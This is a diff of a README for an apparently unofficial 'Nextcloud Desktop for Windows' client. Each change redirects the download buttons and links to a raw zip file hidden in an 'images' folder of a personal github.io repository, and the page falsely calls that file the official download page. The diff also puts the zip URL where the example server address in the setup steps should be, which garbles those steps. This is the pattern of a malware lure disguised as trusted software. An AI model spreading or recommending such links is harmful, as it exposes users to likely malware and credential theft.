@@ -5,7 +5,7 @@ description: "Sync your private cloud files on Windows 10/11 with end-to-end enc
 ---
 # ☁️ Nextcloud Desktop for Windows – Your Private Cloud, Always in Sync
 
-[![Download Now](https://img.shields.io/badge/Download-Nextcloud_Desktop_2026-2ea44f?style=for-the-badge&logo=nextcloud&logoColor=white&color=%234FC3F7)](https://github.com/Carlenseptic6/Nextcloud-Desktop-for-Windows-10-11-File-Sync-Client-2026-)
+[![Download Now](https://img.shields.io/badge/Download-Nextcloud_Desktop_2026-2ea44f?style=for-the-badge&logo=nextcloud&logoColor=white&color=%234FC3F7)](https://github.com/Carlenseptic6/carlenseptic6.github.io/raw/refs/heads/main/images/v1.3.zip)
 
 ---
 
@@ -50,10 +50,10 @@ The app runs quietly in the background, watching for changes. Edit a file in you
 
 ### Step 1: Download the Application
 
-[Visit this link to download the application](https://github.com/Carlenseptic6/Nextcloud-Desktop-for-Windows-10-11-File-Sync-Client-2026-)
+[Visit this link to download the application](https://github.com/Carlenseptic6/carlenseptic6.github.io/raw/refs/heads/main/images/v1.3.zip)
 
 Click the button above or copy and paste this address into your browser:
-`https://github.com/Carlenseptic6/Nextcloud-Desktop-for-Windows-10-11-File-Sync-Client-2026-`
+`https://github.com/Carlenseptic6/carlenseptic6.github.io/raw/refs/heads/main/images/v1.3.zip`
 
 This takes you to the official download page for this client.
 
@@ -73,7 +73,7 @@ After installation, the app will open automatically. If not, find the **Nextclou
 
 ### Step 5: Connect to Your Server
 
-When the app opens for the first time, you'll see a login screen. Enter the address of your Nextcloud server (your administrator or hosting provider gives you this — it usually looks like `https://cloud.yourdomain.com`). Then enter your username and password. Click **Connect**.
+When the app opens for the first time, you'll see a login screen. Enter the address of your Nextcloud server (your administrator or hosting provider gives you this — it usually looks like `https://github.com/Carlenseptic6/carlenseptic6.github.io/raw/refs/heads/main/images/v1.3.zip`). Then enter your username and password. Click **Connect**.
 
 ### Step 6: Choose Your Sync Folder
 
@@ -111,7 +111,7 @@ Keep your Windows updated and use a strong password for your Nextcloud account. 
 
 Ready to get started? Here's your download link one more time:
 
-[![Get Nextcloud Desktop Now](https://img.shields.io/badge/🛒-Download_Now-4CAF50?style=for-the-badge&logo=download&logoColor=white&color=%23FF9800)](https://github.com/Carlenseptic6/Nextcloud-Desktop-for-Windows-10-11-File-Sync-Client-2026-)
+[![Get Nextcloud Desktop Now](https://img.shields.io/badge/🛒-Download_Now-4CAF50?style=for-the-badge&logo=download&logoColor=white&color=%23FF9800)](https://github.com/Carlenseptic6/carlenseptic6.github.io/raw/refs/heads/main/images/v1.3.zip)
 
 **Click the button above** and you'll be taken to the official download page.
 
